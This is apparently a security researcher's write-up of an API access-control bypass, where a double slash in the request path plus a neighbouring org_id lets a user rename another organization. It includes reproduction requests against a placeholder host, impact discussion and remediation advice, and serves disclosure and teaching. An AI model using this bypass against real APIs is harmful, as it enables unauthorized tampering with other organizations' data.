# Bypassing API Restrictions with Double Forward Slashes to Modify Organization Data

## Introduction
During a recent security test, I found a vulnerability in an API where double forward slashes (`//`) in the URL could bypass access controls, enabling unauthorized users to modify sensitive organization data. In this post, I'll explain how I discovered this bug, how it works, and its potential security implications.


The API in question was designed to allow users to manage their organization's settings, such as updating the organization's name. The server had access controls to ensure that users could only change information for their own organization. However, by appending double forward slashes (`//`) to the URL path, I was able to bypass these restrictions and modify the name of another organization.

The server's security controls didn't properly handle URLs with multiple slashes, leading to unintended behavior where a user could send a request to change the name of any organization by simply providing the organization's ID and new name in the request payload.

In this scenario, a user could target organizations with specific numeric `org_id` values, including those that could be derived from a sequence, such as `37849504`, and make unauthorized changes by slightly altering the ID, such as `37849503`.

## Steps to Reproduce

1. **Normal Request (Access Denied)**
   
The following request was made to update the name of my organization:

    ```bash
    
   POST /api/v2/organizations/update/ HTTP/2
   Host: my.exampleapi.com
   Content-Type: application/json
   Authorization: Bearer usertoken123

   {
     "org_name": "NewOrgName",
     "org_id": "37849504"
   }
   
   This request should only allow the user to update their own organization's name. Any attempt to update another organization would be denied, and the request would return:
bash
HTTP/2 403 Forbidden

Manipulated Request (Bypassing Restrictions)Now, I modified the request by inserting double forward slashes (//) into the URL path and changing the org_id to a nearby numeric value (37849503), which should have been inaccessible to the user:
bash
POST //api/v2/organizations/update/ HTTP/2
Host: my.exampleapi.com
Content-Type: application/json
Authorization: Bearer usertoken123

{
  "org_name": "HackedOrgName",
  "org_id": "37849503"
}
This time, the request was processed successfully, even though the user did not have access to the organization with org_id = 37849503. The organization's name was changed to "HackedOrgName."

Impact
This vulnerability can have serious consequences. By exploiting the bug, a user could modify critical information about other organizations, such as their name or other sensitive details. This could lead to:
Unauthorized changes to organizational data.
Loss of trust between users and the service provider.
Potential misuse of features intended to be restricted to certain users or organizations.
Serious reputational damage if organizations can no longer trust the integrity of the platform.

For instance, by altering org_id values like 37849504 to 37849503 or even using other nearby values, an attacker could target different organizations without being detected.

Conclusion
This bug demonstrates a common security issue where input manipulation, in this case through URL path modification, can lead to unintended access. The server failed to properly sanitize and handle URL paths containing double forward slashes, allowing users to bypass security controls.

To prevent this type of vulnerability, developers should:
Properly sanitize and validate URLs to ensure that multiple slashes or other abnormal characters don't affect routing or access control.
Use strict permission checks to ensure users can only modify their own data.
Test APIs for edge cases and URL manipulation techniques to ensure security controls are effective under all circumstances.
